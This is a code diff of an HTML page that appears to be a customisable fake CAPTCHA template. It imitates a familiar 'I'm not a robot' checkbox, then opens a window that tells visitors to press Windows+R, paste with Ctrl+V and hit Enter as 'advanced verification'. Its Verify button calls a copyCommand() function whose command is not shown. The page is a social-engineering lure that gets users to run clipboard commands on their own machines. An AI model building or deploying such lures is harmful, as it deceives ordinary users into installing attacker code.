@@ -3,36 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bot Verification</title>
-    <link rel="stylesheet" href="styles.css">
+    <title>Fake CAPTCHA Verification</title>
+    <link href="styles.css" rel="stylesheet">
     <script src="script.js" defer></script>
-
-    <style>
-        /* Simple Styling */
-        .windows-key {
-            font-weight: bold;
-            color: red;
-        }
-    </style>
 </head>
 <body>
-    <div class="captcha-container">
-        <div class="captcha-header">
-            <h2>Verify you're not a bot</h2>
+
+<!-- Fake CAPTCHA Start -->
+<div class="fkrc-container fkrc-m-p">
+    <!-- Captcha checkbox widget -->
+    <div id="fkrc-checkbox-window" class="fkrc-checkbox-window fkrc-m-p fkrc-block">
+        <div class="fkrc-checkbox-container fkrc-m-p">
+            <button type="button" id="fkrc-checkbox" class="fkrc-checkbox fkrc-m-p fkrc-line-normal" onclick="showVerificationWindow()"></button>
         </div>
-        <div class="captcha-content">
-            <div class="captcha-box">
-                <input type="text" id="captchaInput" placeholder="Enter the characters you see" />
-                <div id="captchaImage" class="captcha-image"></div>
-            </div>
-            <div class="captcha-actions">
-                <button id="verifyButton" onclick="verifyCaptcha()">Verify</button>
-            </div>
-        </div>
-        <div id="resultMessage" class="result-message"></div>
-        <div class="command-instructions" style="display: none;">
-            <p>Advanced verification required. Please press <b>Windows + R</b>, then <b>Ctrl + V</b>, and hit <b>Enter</b> to initiate the advanced verification process.</p>
-        </div>
+        <p class="fkrc-im-not-a-robot fkrc-m-p fkrc-line-normal">I'm not a robot</p>
+        <img src="images/captcha_logo.svg" class="fkrc-captcha-logo fkrc-line-normal" alt="Captcha Logo">
+        <p class="fkrc-checkbox-desc fkrc-m-p fkrc-line-normal">CAPTCHA</p>
+        <p class="fkrc-checkbox-desc fkrc-m-p fkrc-line-normal">Privacy - Terms</p>
+        <img src="images/captcha_spinner.gif" class="fkrc-spinner fkrc-m-p fkrc-line-normal" alt="Captcha Spinner" id="fkrc-spinner">
     </div>
+
+    <!-- Captcha verification window -->
+    <div id="fkrc-verifywin-window" class="fkrc-verifywin-window">
+        <div class="fkrc-verifywin-container">
+            <header class="fkrc-verifywin-header">
+                <span class="fkrc-verifywin-header-text-medium fkrc-m-p fkrc-block">This is your</span>
+                <span class="fkrc-verifywin-header-text-big fkrc-m-p fkrc-block">Fake CAPTCHA</span>
+                <span class="fkrc-verifywin-header-text-medium fkrc-m-p fkrc-block">Customize it however you want</span>
+            </header>
+            <main class="fkrc-verifywin-main">
+                <!-- Content for verification -->
+                <p>Advanced verification required. Please press <b>Windows + R</b>, then <b>Ctrl + V</b>, and hit <b>Enter</b> to initiate the advanced verification process.</p>
+            </main>
+        </div>
+        <footer class="fkrc-verifywin-container fkrc-verifywin-footer">
+            <div class="fkrc-verifywin-footer-left">
+                Press the verify button to proceed.
+            </div>
+            <button type="button" class="fkrc-verifywin-verify-button fkrc-block" id="fkrc-verifywin-verify-button" onclick="copyCommand()">Verify</button>
+        </footer>
+    </div>
+
+    <img src="images/captcha_arrow.svg" alt="Arrow" class="fkrc-verifywin-window-arrow" id="fkrc-verifywin-window-arrow"/>
+</div>
+<!-- Fake CAPTCHA End -->
+
 </body>
 </html>
